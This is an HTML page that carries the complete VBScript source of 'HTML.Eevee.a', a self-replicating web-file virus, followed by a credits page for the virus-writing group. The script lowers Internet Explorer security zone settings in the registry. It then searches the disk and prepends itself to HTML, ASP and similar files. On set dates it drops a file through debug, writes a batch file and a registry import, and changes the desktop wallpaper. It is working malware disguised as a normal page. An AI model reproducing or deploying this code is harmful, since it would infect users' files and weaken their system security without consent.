<!--Eevee-->
<HTML>
<BODY>
<SCRIPT Language = "JavaScript">
<!--
	var userAgent=navigator.appName;
	var agentInfo=userAgent.substring(0, 1);
    if(agentInfo == "M"){
}
else {
alert("The page you want to view was designed for Internet Explorer only, \n Please view this page with Internet Explorer")
self.close()
}
//-->
</SCRIPT>

<Script Language = "VBScript">
<!--
On Error Resume Next
'HTML.Eevee.a
'By -KD- [Metaphase VX Team & NoMercyVirusTeam]
'Technology used from foxz [NoMercyVirusTeam]
'Part of the HTML Pokemon Family
'This Family goes out to IDT
Set WshShell = CreateObject("WScript.Shell")
WshShell.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
If location.protocol = "file:" then
  Randomize
  Set TRange = document.body.createTextRange()
  HPath = Replace(location.href, "/", "\")
  Set FSO = CreateObject("Scripting.FileSystemObject")
  HPath = Replace(HPath, "file:\\\", "")
  HPath = FSO.GetParentFolderName(HPath)
  Call GetFolder(HPath)
  Call GetFolder("C:\")
  Call GetFolder("C:\My Documents")
  Call GetFolder("C:\Windows")
  Call GetFolder("C:\Windows\System")
  Call GetFolder("C:\Windows\ShellNew")
  Call GetFolder("C:\Windows\Help")
  Call GetFolder("C:\Windows\Temp")
  Call GetFolder("C:\Windows\Web")
  Call GetFolder("C:\Windows\Web\Wallpaper")
  Call GetFolder("C:\Program Files\Microsoft Office\Office\Headers")
  Call GetFolder("C:\Inetpub\wwwroot")
  Call GetFolder("C:\Inetpub\wwwroot\myweb")
  Call GetFolder("C:\Program Files\Internet Explorer\Connection Wizard")
  Call GetFolder("C:\Program Files\Microsoft FrontPage\bin")	
End If
If Day(Now()) = 3 or Day(Now()) = 18 or Day(Now()) = 30  Then
  Set DropEevee = FSO.CreateTextFile("c:\Windows\pokemon.dll", 2, False)
  DropEevee.WriteLine  "n Eeevee.jpg"
  DropEevee.WriteLine  "e 0100 ff d8 ff e0 00 10 4a 46 49 46 00 01 01 01 00 48 "
  DropEevee.WriteLine  "e 0110 00 48 00 00 ff db 00 43 00 0f 0a 0b 0d 0b 09 0f "
  DropEevee.WriteLine  "e 0120 0d 0c 0d 11 10 0f 11 16 25 18 16 14 14 16 2d 20 "
  DropEevee.WriteLine  "e 0130 22 1b 25 35 2f 38 37 34 2f 34 33 3b 42 55 48 3b "
  DropEevee.WriteLine  "e 0140 3f 50 3f 33 34 4a 64 4b 50 57 5a 5f 60 5f 39 47 "
  DropEevee.WriteLine  "e 0150 68 6f 67 5c 6e 55 5d 5f 5b ff db 00 43 01 10 11 "
  DropEevee.WriteLine  "e 0160 11 16 13 16 2b 18 18 2b 5b 3d 34 3d 5b 5b 5b 5b "
  DropEevee.WriteLine  "e 0170 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b "
  DropEevee.WriteLine  "e 0180 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b "
  DropEevee.WriteLine  "e 0190 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b ff c0 "
  DropEevee.WriteLine  "e 01a0 00 11 08 00 3d 00 54 03 01 22 00 02 11 01 03 11 "
  DropEevee.WriteLine  "e 01b0 01 ff c4 00 1a 00 00 02 03 01 01 00 00 00 00 00 "
  DropEevee.WriteLine  "e 01c0 00 00 00 00 00 00 04 05 00 02 03 01 06 ff c4 00 "
  DropEevee.WriteLine  "e 01d0 2c 10 00 02 02 01 03 04 00 05 03 05 00 00 00 00 "
  DropEevee.WriteLine  "e 01e0 00 00 01 02 00 03 11 04 12 21 05 31 41 51 06 13 "
  DropEevee.WriteLine  "e 01f0 23 52 71 32 61 a1 14 22 42 91 b1 ff c4 00 18 01 "
  DropEevee.WriteLine  "e 0200 00 03 01 01 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropEevee.WriteLine  "e 0210 01 02 03 04 00 ff c4 00 1d 11 00 03 01 00 03 01 "
  DropEevee.WriteLine  "e 0220 01 01 00 00 00 00 00 00 00 00 00 01 02 11 03 12 "
  DropEevee.WriteLine  "e 0230 21 31 13 22 ff da 00 0c 03 01 00 02 11 03 11 00 "
  DropEevee.WriteLine  "e 0240 3f 00 cc 6b 07 dd 2c 35 a3 ee 9e 76 ad 5a 3b 72 "
  DropEevee.WriteLine  "e 0250 4e df 70 82 eb b8 2a de bb 8f 60 4e 20 74 93 c2 "
  DropEevee.WriteLine  "e 0260 d2 9d 7c 1b ea b5 5b b4 96 0c f7 52 22 6d 36 4f "
  DropEevee.WriteLine  "e 0270 73 25 bf 35 06 18 1e 66 55 be c0 72 39 87 49 de "
  DropEevee.WriteLine  "e 0280 af a3 9e 9d d3 9b a8 1b 12 82 a1 94 67 07 cc 17 "
  DropEevee.WriteLine  "e 0290 5b a1 b7 48 fb 6f 42 a6 32 f8 63 50 d5 25 8c 48 "
  DropEevee.WriteLine  "e 02a0 5d cd 8e 67 a3 ea f4 e9 f5 da 13 53 b2 96 61 95 "
  DropEevee.WriteLine  "e 02b0 60 46 54 c5 ed 8c 3d 75 1e 0a b5 dc 70 0c ca ea "
  DropEevee.WriteLine  "e 02c0 5d 18 99 b5 a8 fa 7b 4a b0 c3 29 c1 9a a9 17 26 "
  DropEevee.WriteLine  "e 02d0 00 c9 8c 20 bc ea 2c db b4 b1 c4 af cf 23 cc de "
  DropEevee.WriteLine  "e 02e0 ca 2a 0f b5 ed 45 63 e3 39 30 5b 76 23 ed 4c 9c "
  DropEevee.WriteLine  "e 02f0 79 30 76 4c 77 14 96 b3 51 73 11 24 c4 1e 24 84 "
  DropEevee.WriteLine  "e 0300 40 0a ff 00 73 88 46 ed f5 ed f2 3f 49 95 50 17 "
  DropEevee.WriteLine  "e 0310 86 50 66 8a a8 7c 62 07 e8 55 63 d4 64 bd 43 51 "
  DropEevee.WriteLine  "e 0320 41 da 18 95 1c 14 6e 44 65 a3 b8 6a 42 ed 42 1b "
  DropEevee.WriteLine  "e 0330 3c a9 82 3e 89 6e 00 82 41 f7 0c e9 bf 3e bf a4 "
  DropEevee.WriteLine  "e 0340 76 b0 4e 54 e3 9f c4 5a d4 bc 2d 0f bd 7f 43 8a "
  DropEevee.WriteLine  "e 0350 29 08 a1 04 bb 06 ac e5 49 53 fb 45 dd 27 57 66 "
  DropEevee.WriteLine  "e 0360 a3 a9 1f a6 6b ad 17 0c a4 e7 27 dc df af ea 1a "
  DropEevee.WriteLine  "e 0370 a0 0a 21 7d c3 0b 83 d8 cc 6e 5f 6c d3 7c d2 e9 "
  DropEevee.WriteLine  "e 0380 f0 1b a8 5f b4 b5 9a 82 58 f8 0b e6 26 b7 aa 5f "
  DropEevee.WriteLine  "e 0390 61 2a a7 e5 d7 f6 a7 1f cc 65 ab 7d 40 a1 06 e5 "
  DropEevee.WriteLine  "e 03a0 0e e8 03 12 3b 40 29 d1 2a 1d c4 86 69 a7 8f d5 "
  DropEevee.WriteLine  "e 03b0 e9 8b 95 f5 7a 8b e9 d7 6a 6f 6f d4 7c 1f 12 a4 "
  DropEevee.WriteLine  "e 03c0 0c f7 96 b0 30 6c 09 02 8c 72 79 95 44 2a 9d 7d "
  DropEevee.WriteLine  "e 03d0 2b 81 ec c9 21 74 07 12 42 29 a3 52 be 44 b5 55 "
  DropEevee.WriteLine  "e 03e0 86 6c 2a ff 00 b8 51 4c 2f 93 32 3b d4 e7 89 24 "
  DropEevee.WriteLine  "e 03f0 9e 81 17 7a 5e ba b7 7a fd e1 7a 7d 16 b3 4d a7 "
  DropEevee.WriteLine  "e 0400 fe b2 ca be 9f 91 e7 1e e0 22 c2 c7 3c f0 63 fd "
  DropEevee.WriteLine  "e 0410 27 c4 a2 8a 7e 5d 94 9c 11 82 4c 16 f1 61 48 78 "
  DropEevee.WriteLine  "e 0420 f4 04 f5 14 27 15 a2 8c f7 3d 8c e2 f5 15 40 15 "
  DropEevee.WriteLine  "e 0430 d0 10 3c 9e 49 8e 74 b5 74 7e ae 87 7d 28 8d 9e "
  DropEevee.WriteLine  "e 0440 e8 76 9f e2 13 77 48 e9 3d 3a 92 e6 b0 de 72 e7 "
  DropEevee.WriteLine  "e 0450 77 fd 99 b1 1b 7f 57 87 9f 3a 5b 7a a5 6f 75 4b "
  DropEevee.WriteLine  "e 0460 85 4f bb 8c c5 16 6e ae c6 04 60 8e 08 8d f5 3f "
  DropEevee.WriteLine  "e 0470 11 a5 61 a9 d3 ae 17 b7 a1 10 be a7 7b b1 6f f2 "
  DropEevee.WriteLine  "e 0480 9a 78 93 48 cb cb 5d 9e 97 66 05 73 e6 62 e5 b1 "
  DropEevee.WriteLine  "e 0490 db 89 09 e3 23 b4 ce cb 4e 31 99 62 25 49 39 92 "
  DropEevee.WriteLine  "e 04a0 55 55 9c 64 19 27 1c 3d 5d 46 06 0e 27 58 a3 72 "
  DropEevee.WriteLine  "e 04b0 08 cc cb 68 6e f3 51 4d 6d 81 8c 7e 22 4d 68 13 "
  DropEevee.WriteLine  "e 04c0 38 a9 ef 1f 91 2c 51 49 ce 66 6f 56 ce cc 71 38 "
  DropEevee.WriteLine  "e 04d0 07 9c ce 68 e0 ae 9e 42 da 50 8c 79 52 25 f5 36 "
  DropEevee.WriteLine  "e 04e0 5f ac 7f 97 6d 84 84 ed 04 52 49 e0 95 3e c1 9a "
  DropEevee.WriteLine  "e 04f0 d2 cc 84 e1 db fb bb 9f 72 2e 7d f0 d3 1c b0 a7 "
  DropEevee.WriteLine  "e 0500 29 00 5b a4 ef f9 82 59 a7 2b e7 98 ee ea d4 28 "
  DropEevee.WriteLine  "e 0510 03 3c fb 82 b5 08 39 3c cb a7 88 85 35 be 0a 7e "
  DropEevee.WriteLine  "e 0520 a2 f1 9e 25 4a 3b 72 63 1b 2a 5f 03 12 a9 52 fa "
  DropEevee.WriteLine  "e 0530 9c a8 1a 04 29 6c 49 1a 2d 2a 44 91 b4 e3 ff d9 "
  DropEevee.WriteLine  "RCX"
  DropEevee.WriteLine  "0440"
  DropEevee.WriteLine  "W"
  DropEevee.WriteLine  "Q"
  DropEevee.Close
  Set MyBat = FSO.CreateTextFile("c:\Windows\WinStart.bat", 2, False)
  MyBat.WriteLine ""
  MyBat.WriteLine "@echo off"
  MyBat.WriteLine "debug < c:\Windows\pokemon.dll > nul"
  MyBat.WriteLine ""
  MyBat.Close
  Set MyReg = FSO.CreateTextFile("c:\Windows\pokemon.reg", 2, False)
  MyReg.WriteLine "REGEDIT4"
  MyReg.WriteLine ""
  MyReg.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer]"
  MyReg.WriteLine chr(34) & "ShellState" & chr(34) & "=hex:1c,00,00,00,e3,08,00,00,00,00,00,00,00,00,00,00,00,00,00,00,01,00,00,00,0a,00,00,00"
  MyReg.WriteLine ""
  WshShell.Run("regedit /s c:\Windows\pokemon.reg"), VbHide
  WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General\Wallpaper", "C:\Windows\Eeevee.jpg" 
  WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General\BackupWallpaper", "C:\Windows\Eeevee.jpg" 
  WshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\desktop\TileWallpaper", "1"
  WshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\desktop\Wallpaper", "C:\Windows\Eeevee.jpg" 
End If
Sub GetFolder(InfPath)
On Error Resume Next
Randomize
If FSO.FolderExists(InfPath) Then
  Do
  Set FolderObj = FSO.GetFolder(InfPath)
  InfPath = FSO.GetParentFolderName(InfPath)
  Set FO = FolderObj.Files
  For each NewFile in FO
  ExtName = Lcase(FSO.GetExtensionName(NewFile.Name))
  If ExtName = "htt" Or ExtName = "asp" Or ExtName = "htm" Or ExtName = "hta" _
 Or ExtName = "htx" Or ExtName = "html" Then
    Set MyEevee = FSO.GetFile(NewFile.path)
    Set Eevee = MyEevee.OpenAsTextStream(1)
    EeveeCheck = Eevee.readline
    Eevee.close()
      If EeveeCheck <> "<!--Eevee-->" then
      InfectFile NewFile.path
      End If
  End If
  Next
  Loop While FolderObj.IsRootFolder = False
End If
End Sub

Sub InfectFile(GetFileName)
On Error Resue Next
Randomize
Set MyEevee = FSO.GetFile(GetFileName)
Set Eevee = MyEevee.OpenAsTextStream(1)
FileContents = Eevee.ReadAll()
Eevee.Close
Set MyEevee = FSO.GetFile(GetFileName)
Set Eevee = MyEevee.OpenAsTextStream(2)
Eevee.WriteLine "<!--Eevee-->"
Eevee.WriteLine "<html><body>"
Eevee.WriteLine(TRange.htmlText)
Eevee.Write("</body></html>" + Chr(13) + Chr(10))
Eevee.Write FileContents
Eevee.Close
End Sub
-->
</SCRIPT>
</BODY>
</HTML>
<HTML>
<HEAD>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1252">
<TITLE>Metaphase VX Team</TITLE>
<STYLE TYPE="text/css">
.namelist {
	font-family : Times New Roman;
	color		: #ffffe0;
	font-size	: 18;
};
.thx {
	color		: #ffffe0;
	font-size	: 24;
	text-align	: center;
}
</STYLE>

<SCRIPT LANGUAGE=JavaScript>
var names = new Array (
'Knowdeth','Knowdeth',
'Sinixstar','Sinixstar',
'Demonphreak_','Demonphreak_',
'Sblip','Sblip',
'Raven','Raven',
'nucleii','nucleii',
'jackie','jackie',
'Evul','Evul',
'MetalKid','MetalKid',
'VxFaerie','VxFaerie',
'Lys Kovick','Lys Kovick',
'','',
'','',
'','',
'','',
'','',
'Specal Thanks To All The Beta Testers','BETA',
'and many many more...','',
'<BR><BR><BR>Welcome To<BR>A Member Of<BR>The<BR>HTML Pokemon<BR>Family<BR>By -KD-<BR>Metaphase <BR>&<BR> NoMercy<BR><BR>2000<BR>','thx0'
);

var namesIndex = 0;
var namesIndexOrg;

var pics = new Array (
	'c_place.jpg',	'1',
	'bld27.jpg',	'2',
	'brick.jpg',	'1',
	'welcome.jpg',	'2',
	'bld1678.jpg',	'1',
	'cd.jpg',		'2',
	'emp1.jpg',		'1',
	'emp3.jpg',		'2',
	'rtm1.jpg',		'1',
	'bus.jpg',		'2',
	'c_bike.jpg',	'3',
	'c_ftn1.jpg',	'1',
	'c_ftn3.jpg',	'2',
	'c_ftn4.jpg',	'1',
	'c_bird3.jpg',	'2',
	'c_bird2.jpg',	'3',
	'c_lake1.jpg',	'1',
	'c_lake2.jpg',	'2',
	'c_cafe.jpg',	'3',
	'c_recep.jpg',	'1',
	'c_sport.jpg',	'2',
	'hammer2.jpg',	'1',
	'piers.jpg',	'2',
	'kingdom.jpg',	'1',
	'needle.jpg',	'3',
	'sea-bld1.jpg',	'1',
	'sea-bld3.jpg',	'2',
	'train.jpg',	'1',
	'water2.jpg',	'3',
	'water1.jpg',	'1',
	'market.jpg',	'2'
);

var picsIndex = 0;

var creditsTimeout = 5500;
var picsTimeout = 2000;
var stopTimeout = 5000;

var nameCount = 21;
var nameX = document.all.name1;
var nameP = document.all.name2;

function showNames() {
	var nString = "";
	var i, j = names.length;
	var bEof = false;

	namesIndexOrg = -1;
	if (namefind.innerText != "") {
		for (i = 1; i < j; i += 2) {
			if (names[i] == namefind.innerText) {
				namesIndexOrg = namesIndex;
				namesIndex = i - 1;
				break;
			}
		}
	}

	for (i = 0; i < nameCount && namesIndex < j; 
				i++, namesIndex += 2) {
		if (names[namesIndex + 1] == 'thx0') {
			if (i)
				break;
			else
				bEof = true;
		}
		nString = nString + names[namesIndex] + "<BR>";
	}

	if (nameX == document.all.name2) {
		nameX = document.all.name1;
		nameP = document.all.name2;
	} else {
		nameX = document.all.name2;
		nameP = document.all.name1;
	}

	ShowHideObj(nameP, 0, 1);
	if (bEof)
		nameX = document.all.thxtext;
	nameX.innerHTML = nString;
	ShowHideObj(nameX, 1, 1);

	// restore the original index, if name jumped
	if (namesIndexOrg != -1) {
		namesIndex = namesIndexOrg;
		namefind.innerText = "";
	}		

	return (namesIndex < j);
};


function ShowHideObj(obj, bShowHide, bApply)
{
	var vis;

	vis = bShowHide == 1 ? "visible" : "hidden";

	if (screen.colorDepth >= 24)
		obj.style.visibility = vis;
	else {
		if (bApply == 1)
			obj.filters(0).apply();
		obj.style.visibility = vis;
		obj.filters(0).play();
	}
}

var imgX = document.all.img1;
var imgP = document.all.img2;
var prevImgType = '2';

function ShowPic() 
{
	switch (pics[picsIndex + 1]) {
	case '1':
		imgX = document.all.img1;
		break;
	case '2':
		imgX = document.all.img2;
		break;
	case '3':
		imgX = document.all.img3;
		break;
	}
	
	switch (prevImgType) {
	case '1':
		imgP = document.all.img1;
		break;
	case '2':
		imgP = document.all.img2;
		break;
	case '3':
		imgP = document.all.img3;
		break;
	}
	
	if (pics[picsIndex + 1] == '3') {
		ShowHideObj(frmLandscape, 0, 1);
		ShowHideObj(frmPortrait, 1, 1);
	}
	if (prevImgType == '3') {
		ShowHideObj(frmPortrait, 0, 1);
		ShowHideObj(frmLandscape, 1, 0);
	}

	prevImgType = pics[picsIndex + 1];
	
	ShowHideObj(imgP, 0, 1);
	imgX.innerHTML = "<IMG SRC=res://membg.dll/" + pics[picsIndex] + ">";
	ShowHideObj(imgX, 1, 1);
		
	picsIndex += 2;

	if (picsIndex >= pics.length)
		picsIndex = 0;
}


var bFullStop = false;

function credits()
{
	if (initxt.innerHTML != '') {
		initxt.innerHTML = '';
		ShowHideObj(initxt, 0, 1);
	}

	if (showNames())
		window.tm = setTimeout('credits();', creditsTimeout);
	else 
		window.tm = setTimeout('StopShow();', stopTimeout);
}


function StopShow()
{
	bFullStop = true;
	window.tm = setTimeout('closeProc();', 1);
}


function ShowImages() 
{
	if (frmLandscape.style.visibility == "hidden") 
		ShowHideObj(frmLandscape, 1, 1);

	ShowPic();

	if (bFullStop == false || (picsIndex < 1 || picsIndex > 4))
		window.tm = setTimeout('ShowImages();', picsTimeout);
}


function ShowNameImg()
{
	ShowHideObj(imgBkg, 1, 1);
	ShowHideObj(crd, 1, 1);

	document.all.initxt.innerHTML = 'The Metaphase VX Team<BR><BR>This list represents but a portion<BR>of the key people. through out the years.<BR><BR><BR><BR><BR><B>From Old School To New</B>'

	ShowHideObj(initxt, 1, 1);

	window.tm = setTimeout('ShowImages();', picsTimeout);
	window.tm = setTimeout('credits();', 8000);
}


function intro() 
{
	if (ShowNum())
		window.tm = setTimeout('intro();', 100);
	else {
		winnum.style.visibility = "hidden";
		ShowNameImg();
	}
}

var WinVerList = new Array (
	'&#139;&#139;',
	'&#140;&#139;',
	'&#140;&#141;',
	'&#142;&#141;',
	'&#142;&#143;',
	'&#144;&#143;',
	'&#144;&#145;',
	'&#146;&#145;',
	'&#148;&#147;',
	'&#137;&#136;',
	'&#148;&#147;',
	'&#137;&#136;',
	'&#148;&#147;'
);

var numIdx = 0;

function ShowNum() 
{
//useless section
};

</SCRIPT>

<script language=vbs>
dim strEmp : strEmp = ""
Sub keydownx()
	keyCode = window.event.keycode
	
	select case keyCode
	case 13
		namefind.innerText = strEmp
		strEmp = ""
	case 27
		strEmp = ""
	case else
		if (keyCode <= 255 AND keyCode >= 32) then
			strEmp = strEmp & chr(keyCode)
		end if
	end select
End sub

Sub closeProc()
	ON ERROR RESUME NEXT
End Sub
</script>

</HEAD>

<BODY BGCOLOR="#000000" ONLOAD="intro()" ONKEYDOWN="keydownx()">

<IMG id=imgBkg SRC="res://membg.dll/backgnd.gif" ALIGN="CENTER" VALIGN="CENTER" 
style="position:absolute; left:0; top:0; 
filter:revealTrans(duration=2.0,transition=7; z-index:1; visibility:hidden">

<DIV ID=name1 class="namelist" ALIGN=LEFT VALIGN=TOP
style="position:absolute; left:83; top:22; z-index:90;
filter:blendTrans(duration=0.8); visibility:hidden">
</DIV>

<DIV ID=name2 class="namelist" ALIGN=LEFT VALIGN=TOP
style="position:absolute; left:83; top:22; z-index:90;
filter:blendTrans(duration=0.8); visibility:hidden">
</DIV>

<DIV ID=thxtext class="thx" VALIGN=TOP
style="position:absolute; left:83; top:22; z-index:90; width:180;
filter:blendTrans(duration=0.8); visibility:hidden">
</DIV>

<DIV ID=initxt class="thx" VALIGN=TOP
style="position:absolute; left:78; top:22; z-index:90; width:240; font-size:18;
filter:blendTrans(duration=0.8); visibility:hidden">
</DIV>

<IMG id=frmLandscape SRC="res://membg.dll/frame0.jpg" 
style="position:absolute; left:330;top:49; z-index:90;
filter:blendTrans(duration=0.50); visibility:hidden">

<IMG id=frmPortrait SRC="res://membg.dll/frame1.jpg" 
style="position:absolute; left:339;top:38; z-index:90;
filter:blendTrans(duration=0.50); visibility:hidden">

<IMG id=logo SRC="res://membg.dll/logo.gif" 
style="position:absolute; left:278;top:370; z-index:90;
filter:blendTrans(duration=2.00); visibility:hidden">

<IMG id=crd SRC="res://membg.dll/credit.gif" 
style="position:absolute; left:22;top:22; z-index:90;
filter:revealTrans(duration=1.0,transition=5); visibility:hidden">

<DIV id=img1
style="position:absolute; left:344;top:65; z-index:90;
filter:blendTrans(duration=1.00); visibility:hidden">
</DIV>

<DIV id=img2
style="position:absolute; left:344;top:65; z-index:90;
filter:blendTrans(duration=1.00); visibility:hidden">
</DIV>

<DIV id=img3
style="position:absolute; left:358;top:61; z-index:90;
filter:blendTrans(duration=1.00); visibility:hidden">
</DIV>

<DIV ID=namefind></DIV>	

<DIV id=winnum ALIGN="CENTER" style="position:absolute; left:20;top:100; 
font-family:wingdings; font-size:180; font-weight:bold; color:#0000ff;	
visibility=hidden"></DIV>

<OBJECT id="discwav" style = "visibility:hidden"
	classid="CLSID:05589FA1-C356-11CE-BF01-00AA0055595A">
	<PARAM NAME="ShowDisplay" VALUE="-1">
	<PARAM NAME="AutoStart" VALUE="1">
	<PARAM NAME="AutoRewind" VALUE="1">
	<PARAM NAME="PlayCount" VALUE="8">
	<PARAM NAME="FileName" VALUE="C:\WINDOWS\Application Data\Microsoft\WELCOME\welcom98.wav">

</OBJECT>
</BODY>
</HTML>